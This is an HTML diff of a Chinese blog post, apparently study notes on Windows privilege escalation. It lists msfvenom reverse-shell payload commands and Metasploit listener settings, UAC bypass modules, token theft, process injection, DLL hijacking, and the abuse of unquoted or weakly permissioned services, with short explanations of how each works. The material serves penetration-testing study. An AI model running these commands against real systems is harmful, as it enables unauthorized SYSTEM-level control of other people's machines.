@@ -1,0 +1,825 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/%E6%A5%BD.png">
+  <link rel="icon" href="/img/%E6%A5%BD.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="神楽">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="人工提权 在本地cmd执行systeminfo &gt; 1.txt  用脚本筛选可能漏洞   python wes.py systeminfo.txt –color python wes.py systeminfo.txt –color -i “Elevation of Privilege”  针对提供漏洞找提权脚本  KernelHub 针对常用溢出编号指定找EXP Poc-in-Github">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows提权">
+<meta property="og:url" content="https://helloworldbugs.gitlab.io/2024/06/06/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/Windows%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="神楽的博客">
+<meta property="og:description" content="人工提权 在本地cmd执行systeminfo &gt; 1.txt  用脚本筛选可能漏洞   python wes.py systeminfo.txt –color python wes.py systeminfo.txt –color -i “Elevation of Privilege”  针对提供漏洞找提权脚本  KernelHub 针对常用溢出编号指定找EXP Poc-in-Github">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-06-06T02:45:56.000Z">
+<meta property="article:modified_time" content="2024-06-26T03:01:53.271Z">
+<meta property="article:author" content="神楽">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Windows提权 - 神楽的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"helloworldbugs.gitlab.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":50,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>神楽的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/guidao.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Windows提权"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-06 10:45" pubdate>
+          2024年6月6日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          29 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Windows提权</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2024年6月26日 上午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="人工提权"><a href="#人工提权" class="headerlink" title="人工提权"></a><strong>人工提权</strong></h2><ol>
+<li><p>在本地cmd执行systeminfo &gt; 1.txt</p>
+</li>
+<li><p>用脚本筛选可能漏洞</p>
+</li>
+</ol>
+<p>python wes.py systeminfo.txt –color</p>
+<p>python wes.py systeminfo.txt –color -i “Elevation of Privilege”</p>
+<ol start="3">
+<li>针对提供漏洞找提权脚本</li>
+</ol>
+<p>KernelHub 针对常用溢出编号指定找EXP</p>
+<p>Poc-in-Github 针对年份及编号指定找EXP</p>
+<p>exploitdb 针对类型及关键说明指定找EXP</p>
+<p>Exploit-DB 使用小结</p>
+<p>searchsploit -u    更新数据库</p>
+<p>searchsploit -h 查看帮助信息</p>
+<ol>
+<li>基本搜索：</li>
+</ol>
+<p>查找特定词的漏洞：</p>
+<p>searchsploit afd windows local</p>
+<ol start="2">
+<li>标题搜索 -t</li>
+</ol>
+<p>默认情况下，searchsploit将检查漏洞的标题以及路径。根据不同的搜索条件，这可能会弹出误报。可以使用 <code>-t</code> 选项将搜索限制为标题：</p>
+<p>searchsploit -t oracle windows</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ascotbe/Kernelhub">https://github.com/Ascotbe/Kernelhub</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a></p>
+<p><a target="_blank" rel="noopener" href="https://gitlab.com/exploit-database/exploitdb">https://gitlab.com/exploit-database/exploitdb</a></p>
+<h2 id="msf使用"><a href="#msf使用" class="headerlink" title="msf使用"></a><strong>msf使用</strong></h2><ol>
+<li>生成反弹后门</li>
+</ol>
+<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.139.141 LPORT&#x3D;3333 -f exe -o msf.exe</p>
+<ol start="2">
+<li>配置监听会话</li>
+</ol>
+<p>use exploit&#x2F;multi&#x2F;handler</p>
+<p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p>
+<p>set lhost 0.0.0.0</p>
+<p>set lport 3333</p>
+<p>exploit</p>
+<ol start="2">
+<li>筛选EXP模块</li>
+</ol>
+<p>全自动：快速识别系统中可能被利用的漏洞</p>
+<p>use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</p>
+<p>set showdescription true</p>
+<ol start="3">
+<li>利用EXP溢出提权</li>
+</ol>
+<p>background</p>
+<p>use exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection_juicy</p>
+<p>set session 1</p>
+<p>exploit</p>
+<h2 id="CS使用"><a href="#CS使用" class="headerlink" title="CS使用"></a><strong>CS使用</strong></h2><p>.&#x2F;teamserver IP password</p>
+<ol>
+<li><p>连接CS</p>
+</li>
+<li><p>创建监听器</p>
+</li>
+<li><p>加载脚本插件</p>
+</li>
+</ol>
+<h2 id="土豆提权原理（MS16-075）"><a href="#土豆提权原理（MS16-075）" class="headerlink" title="土豆提权原理（MS16-075）"></a><strong>土豆提权原理（MS16-075）</strong></h2><p>土豆系列提权的核心是NTLM中继，通过欺骗运行在高权限（Administrator&#x2F;SYSTEM）的账户进行ntlm认证，同时作为中间人对认证过程进行劫持和重放，最后调用本地认证接口使用高权限账号的ntml认证获取一个高权限token，只要当前进程拥有SeImpersonatePrivilege权限即可进行令牌模仿，即可取得对应权限。</p>
+<p>烂土豆(Rotten Potato) MS16-075 提权是一个本地提权，只针对本地用户，不支持域用户。</p>
+<p>  欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端，对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的，模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</p>
+<h4 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a><strong>适用版本</strong></h4><p>  Windows 7&#x2F;8&#x2F;10，Windows server 2008&#x2F;2012</p>
+<p><strong>Windows钓鱼提权</strong></p>
+<p>应用场景：</p>
+<ol>
+<li><p>常规某个机器被钓鱼后门攻击后，我们需要做更高权限操作或权限维持等。</p>
+</li>
+<li><p>内网域中某个机器被钓鱼后门攻击后，我们需要对后续内网域做安全测试。</p>
+</li>
+</ol>
+<h2 id="SC命令服务启动提权"><a href="#SC命令服务启动提权" class="headerlink" title="SC命令服务启动提权"></a><strong>SC命令服务启动提权</strong></h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>早期用at命令，但是现在不常用了，适用版本：<code>Win2000 &amp; Win2003 &amp; XP</code>中还是存在的，在<code>Win7</code>以后被剔除，所以本文不做研究</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>SC命令提权原理主要涉及Windows系统中的服务控制命令（Service Control Command）的利用。具体来说，SC命令是用于与服务控制管理器（Service Control Manager）和服务进行通信的命令行程序，它提供了类似于控制面板中管理工具项中的服务的功能。</p>
+<p>在提权过程中，攻击者可能会使用SC命令以高权限运行的方式创建一个恶意的服务。这个服务可以在系统启动时以系统权限运行，从而实现权限提升。这是因为系统服务通常具有比普通用户更高的权限级别，可以执行一些需要高权限的操作。</p>
+<h3 id="过程及命令"><a href="#过程及命令" class="headerlink" title="过程及命令"></a><strong>过程及命令</strong></h3><p>sc是用于与服务控制管理器和服务进行通信的命令行程序。</p>
+<p>适用版本：windows 7&#x2F;10&#x2F;08&#x2F;12&#x2F;16&#x2F;19&#x2F;22，早期用at命令</p>
+<ol>
+<li>创建一个名叫syscmd的执行文件服务</li>
+</ol>
+<p>sc Create syscmd binPath&#x3D; “c:\msf.exe”</p>
+<ol start="2">
+<li>运行服务</li>
+</ol>
+<p>sc start syscmd</p>
+<h2 id="psexec-exe远程控制（提权）"><a href="#psexec-exe远程控制（提权）" class="headerlink" title="psexec.exe远程控制（提权）"></a><strong>psexec.exe远程控制（提权）</strong></h2><p>psexec.exe是Windows自带的程序不会被查杀</p>
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a><strong>原理</strong></h3><ol>
+<li><p>服务控制管理器（SCM）：SCM是Windows系统中负责管理服务的组件，它允许用户启动、停止、暂停、恢复或查询服务的状态。服务是在Windows操作系统中以后台进程方式运行的应用程序，这些进程不需要用户交互，通常用于执行系统任务。</p>
+</li>
+<li><p>PsExec工具：PsExec是Sysinternals Suite中的一个工具，它允许用户在本地或远程计算机上执行命令。当PsExec在远程计算机上执行命令时，它首先会在远程计算机上安装一个名为PsExecSvc.exe的服务程序。这个服务程序允许PsExec在远程计算机上执行命令。</p>
+</li>
+<li><p>提权过程：</p>
+</li>
+</ol>
+<ul>
+<li><p>PsExec利用SCM启动一个新的服务，该服务的权限被设置为LocalSystem。LocalSystem是Windows系统中最高的权限级别之一，它拥有访问系统资源并执行各种操作的权限。</p>
+</li>
+<li><p>一旦服务被启动，PsExec就可以在该服务的上下文中启动进程。由于服务是以LocalSystem权限运行的，因此PsExec启动的进程也将拥有LocalSystem权限。这意味着PsExec可以执行需要更高权限才能完成的任务，例如访问受限制的文件或执行特权操作。</p>
+</li>
+</ul>
+<h3 id="过程及命令-1"><a href="#过程及命令-1" class="headerlink" title="过程及命令"></a><strong>过程及命令</strong></h3><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
+<p>psexec.exe -accepteula -s -i -d cmd #调用运行cmd</p>
+<h2 id="进程注入（降权-提权）"><a href="#进程注入（降权-提权）" class="headerlink" title="进程注入（降权&amp;提权）"></a><strong>进程注入（降权&amp;提权）</strong></h2><p>进程注入是一种广泛应用于恶意软件和无文件攻击中的逃避技术，这意味着可以将自定义代码运行在另一个进程的地址空间内。进程注入提高了隐蔽性，也实现了持久化。</p>
+<h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a><strong>场景</strong></h3><p>在域环境的时候可从其他用户降至需要的用户，查看相应客户使用的服务</p>
+<p>administrator到system  可以</p>
+<p>system到普通用户  可以</p>
+<p>普通用户到以上用户 不行</p>
+<p>实战中先确认当前用户权限</p>
+<p>如果是administrator管理员用户组权限可以尝试进程注入和令牌窃取</p>
+<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a><strong>过程</strong></h3><p>查看相应权限进程可以提权和降权</p>
+<h4 id="MSF："><a href="#MSF：" class="headerlink" title="MSF："></a><strong>MSF：</strong></h4><p>ps &#x2F;&#x2F;查看进程</p>
+<p>migrate PID &#x2F;&#x2F;迁移对应PID</p>
+<h4 id="CS"><a href="#CS" class="headerlink" title="CS:"></a><strong>CS:</strong></h4><p>ps &#x2F;&#x2F;查看进程</p>
+<p>inject PID &#x2F;&#x2F;注入对应PID</p>
+<p>建议直接用工具来进行进程注入，但是使用进程注入时MSF和CS会冲突，两个工具不能同时使用</p>
+<h2 id="令牌窃取（降权-提权）"><a href="#令牌窃取（降权-提权）" class="headerlink" title="令牌窃取（降权&amp;提权）"></a><strong>令牌窃取（降权&amp;提权）</strong></h2><h3 id="场景-1"><a href="#场景-1" class="headerlink" title="场景"></a><strong>场景</strong></h3><p>在域环境的时候可从其他用户降至需要的用户，查看相应客户使用的服务</p>
+<p>administrator到system  可以</p>
+<p>system到普通用户  可以</p>
+<p>普通用户到以上用户 不行</p>
+<p>实战中先确认当前用户权限</p>
+<p>如果是administrator管理员用户组权限可以尝试进程注入和令牌窃取</p>
+<h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a><strong>过程</strong></h3><h4 id="MSF：-1"><a href="#MSF：-1" class="headerlink" title="MSF："></a><strong>MSF：</strong></h4><p>use incognito</p>
+<p>list_tokens -u</p>
+<p>impersonate_token “NT AUTHORITY\SYSTEM”</p>
+<h4 id="CS-1"><a href="#CS-1" class="headerlink" title="CS:"></a><strong>CS:</strong></h4><p>ps &#x2F;&#x2F;查看进程</p>
+<p>steal_token PID &#x2F;&#x2F;窃取进程令牌</p>
+<p>spawnu PID &#x2F;&#x2F;窃取进程令牌上线</p>
+<h2 id="UACbypass提权"><a href="#UACbypass提权" class="headerlink" title="UACbypass提权"></a><strong>UACbypass提权</strong></h2><p>UAC 是微软在 Windows Vista 以后版本引入的一种安全机制，</p>
+<h3 id="应用场景："><a href="#应用场景：" class="headerlink" title="应用场景："></a><strong>应用场景：</strong></h3><ol>
+<li><p>常规某个机器被钓鱼后门攻击后，我们需要做更高权限操作或权限维持等。</p>
+</li>
+<li><p>内网域中某个机器被钓鱼后门攻击后，我们需要对后续内网域做安全测试。</p>
+</li>
+</ol>
+<h3 id="UAC-实现方法（用户登陆过程）"><a href="#UAC-实现方法（用户登陆过程）" class="headerlink" title="UAC 实现方法（用户登陆过程）"></a><strong>UAC 实现方法（用户登陆过程）</strong></h3><p>ACL（Access Control List）：Windows 中所有资源都有 ACL ，这个列表决定了拥有何种权限的用户&#x2F;进程能够这个资源。在开启了 UAC 之后，如果用户是标准用户， Windows 会给用户分配一个标准 <code>Access Token</code>.如果用户以管理员权限登陆，会生成两份访问令牌，一份是完整的管理员访问令牌（Full Access Token），一份是标准用户令牌。一般情况下会以标准用户权限启动 Explorer.exe 进程。如果用户同意，则赋予完整管理员权限访问令牌进行操作。</p>
+<h3 id="触发UAC"><a href="#触发UAC" class="headerlink" title="触发UAC"></a><strong>触发UAC</strong></h3><blockquote>
+<p>UAC需要授权的动作包括：配置Windows Update增加或删除用户账户改变用户的账户类型改变UAC设置安装ActiveX安装或移除程序安装设备驱动程序设置家长控制将文件移动或复制到Program Files或Windows目录查看其他用户文件夹via Wiki</p>
+</blockquote>
+<h3 id="小迪笔记"><a href="#小迪笔记" class="headerlink" title="小迪笔记"></a><strong>小迪笔记</strong></h3><p>#Win10&amp;11-BypassUAC自动提权-MSF&amp;UACME</p>
+<p>为了远程执行目标的exe或者bat可执行文件需要绕过此安全机制</p>
+<p>在用户到系统权限自动提权中也学通过BypassUAC实现自动化提权</p>
+<p>绕过项目：MSF内置，Powershell渗透框架，UACME项目(推荐)</p>
+<p>开启UAC和未开启UAC时,CS&#x2F;MSF默认getsystem提权影响(进程注入等)</p>
+<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;xx.xx.xx.xx  lport&#x3D;xx -f exe -o msf.exe</p>
+<p>推荐直接使用win10模块，更加符合真实场景</p>
+<ol>
+<li>MSF模块：</li>
+</ol>
+<p>钓鱼用的不推荐</p>
+<p>use exploit&#x2F;windows&#x2F;local&#x2F;ask</p>
+<p>win7：</p>
+<p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassua</p>
+<p>win10:</p>
+<p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_sluihijack</p>
+<p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_silentcleanup</p>
+<ol start="2">
+<li>UACME项目：</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p>
+<p>Akagi64.exe 编号 调用执行</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>UAC就是getsystem失败，然后你通过UACbypass就可以进行getsysteam</p>
+<p>推荐使用UACME项目，很是不错，一个编号不行多换几个</p>
+<p>编号范围1-78，没反应就是没成功</p>
+<h2 id="Windows-DLL劫持提权"><a href="#Windows-DLL劫持提权" class="headerlink" title="Windows-DLL劫持提权"></a><strong>Windows-DLL劫持提权</strong></h2><p>简单说一下流程，就是有些进程权限很高，你就可以找到这些进程调用的dll来进行覆盖和劫持，msf可以生成dll马，要想实现dll劫持先找到进程调用的可劫持dll，不要找Windows文件下的，因为你没权限去修改dll文件，优先找exe文件下的dll，有火绒剑和一个项目ChkDllHijack可以检测都很好用</p>
+<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p>
+<p>Windows查找DLL目录及其顺序如下:</p>
+<ol>
+<li>应用程序加载的目录</li>
+<li>C:\Windows\System32</li>
+<li>C:\Windows\System</li>
+<li>C:\Windows</li>
+<li>当前工作目录Current Working Directory，CWD</li>
+<li>在PATH环境变量的目录（先系统后用户）</li>
+</ol>
+<p>这样的加载顺序很容易导致一个系统dll被劫持，因为只要攻击者将目标文件和恶意dll放在一起即可,导致恶意dll先于系统dll加载，而系统dll是非常常见的，所以当时基于这样的加载顺序，出现了大量受影响软件。</p>
+<h3 id="小迪笔记-1"><a href="#小迪笔记-1" class="headerlink" title="小迪笔记"></a><strong>小迪笔记</strong></h3><p>过程：信息收集-进程调试-制作dll并上传-替换dll-等待启动应用成功</p>
+<p>检测：ChkDllHijack 火绒剑</p>
+<p>项目：<a target="_blank" rel="noopener" href="https://github.com/anhkgg/anhkgg-tools">https://github.com/anhkgg/anhkgg-tools</a></p>
+<p>利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。</p>
+<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;xx.xx.xx.xx  lport&#x3D;xx -f dll -o xiaodi.dll</p>
+<p>提前信息收集相关软件及DLL问题程序，本地调试成功后覆盖DLL实现利用</p>
+<h2 id="Windows-不带引号服务路径配合MSF-MacroExpert"><a href="#Windows-不带引号服务路径配合MSF-MacroExpert" class="headerlink" title="Windows-不带引号服务路径配合MSF-MacroExpert"></a><strong>Windows-不带引号服务路径配合MSF-MacroExpert</strong></h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>当系统管理员配置Windows服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。</p>
+<p>当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p>
+<p>路径没有包含在引号中，服务会按照以下顺序依次执行</p>
+<p>c:\program.exec:\program files.exec:\program files (x86)\grasssoft\macro.exec:\program files (x86)\grasssoft\macro expert\MacroService.exe</p>
+<p>像这种exe路径没有空格也没有带引号的路径就没有安全问题</p>
+<p>D:\网盘下载\百度网盘\BaiduNetdisk\YunUtilityService.exe</p>
+<p>原理总结</p>
+<p>服务路径配置由于目录空格问题，可上传文件配合解析恶意触发执行</p>
+<h3 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a><strong>过程</strong></h3><p>检测服务权限配置-制作文件并上传-服务路径指向解析-等待调用成功</p>
+<p>检测命令：</p>
+<p>wmic service get name,displayname,pathname,startmode |findstr &#x2F;i “Auto” |findstr &#x2F;i &#x2F;v “C:\Windows\“ |findstr &#x2F;i &#x2F;v “””</p>
+<p>上传反弹exe，设置好对应执行名后，执行sc start “Macro Expert”</p>
+<h2 id="Win2012-不安全的服务权限配合MSF-NewServices"><a href="#Win2012-不安全的服务权限配合MSF-NewServices" class="headerlink" title="Win2012-不安全的服务权限配合MSF-NewServices"></a><strong>Win2012-不安全的服务权限配合MSF-NewServices</strong></h2><p>这个不好用就不过多阐述</p>
+<h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a><strong>原理：</strong></h3><p>Windows服务有时被配置为与服务本身或与服务运行的目录相关的弱权限。这可能允许攻击者操纵服务，以便在其启动时执行任意代码，并将权限提升到SYSTEM。</p>
+<h3 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a><strong>利用方法：</strong></h3><p>将服务的 binpath 更改为我们上传的木马文件路径，以便在服务启动时执行恶意代码从而获得system权限。</p>
+<p>accesschk.exe工具介绍：accesschk是一个windows系统配置检查工具，用于查看文件、注册表项、服务、进程、内核对象等的有效权限。该工具将有助于识别当前用户是否可以修改某个服务目录中的文件。</p>
+<p>由于它是微软官方出品，我们将其上传至靶机，执行不会受到阻碍</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p>
+<h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a><strong>过程：</strong></h3><p>检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功</p>
+<p>检测脚本：</p>
+<p>accesschk.exe -uwcqv “” *</p>
+<p>sc config “test” binpath&#x3D; “C:\Program.exe”</p>
+<p>sc start test</p>
+<h2 id="小迪推荐项目"><a href="#小迪推荐项目" class="headerlink" title="小迪推荐项目"></a><strong>小迪推荐项目</strong></h2><p>综合类检测项目：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p>
+<p>PEAS-ng适用于Windows和Linux&#x2F;Unix*和MacOS的权限提升工具。</p>
+<p>winPEAS.bat &gt; result.txt</p>
+<p>winPEASany.exe log&#x3D;result.txt</p>
+<p>原文转自：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/IvfcBpKWEvDA-j_TGa2oHQ">水刃安全</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E5%AE%89/" class="category-chain-item">网安</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/" class="category-chain-item">内网横向</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/06/12/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" title="数据库提权">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">数据库提权</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/30/%E7%B3%BB%E7%BB%9F/linux/ProxmoxVE/" title="Proxmox VE">
+                        <span class="hidden-mobile">Proxmox VE</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
